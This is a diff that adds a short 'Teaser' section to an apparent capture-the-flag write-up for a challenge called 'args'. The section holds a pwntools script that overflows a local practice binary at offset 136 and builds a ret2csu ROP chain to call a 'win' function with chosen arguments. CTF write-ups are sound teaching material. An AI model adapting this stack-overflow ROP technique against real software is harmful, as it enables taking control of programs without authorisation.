@@ -174,3 +174,20 @@ LNC{C5U_H4V3_7H3_GADGETS}
 
 _p.s. this was probably not the intended way of solving args but welp_
 
+---
+
+### Teaser
+
+```py
+from pwn import *
+p = process("./argssource")
+context.binary = 'argssource'
+
+rop = ROP(context.binary)
+rop.ret2csu(0xdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
+rop.call('win')
+
+p.sendline(flat({ 136: rop.chain()}))
+print(p.recv())
+
+```
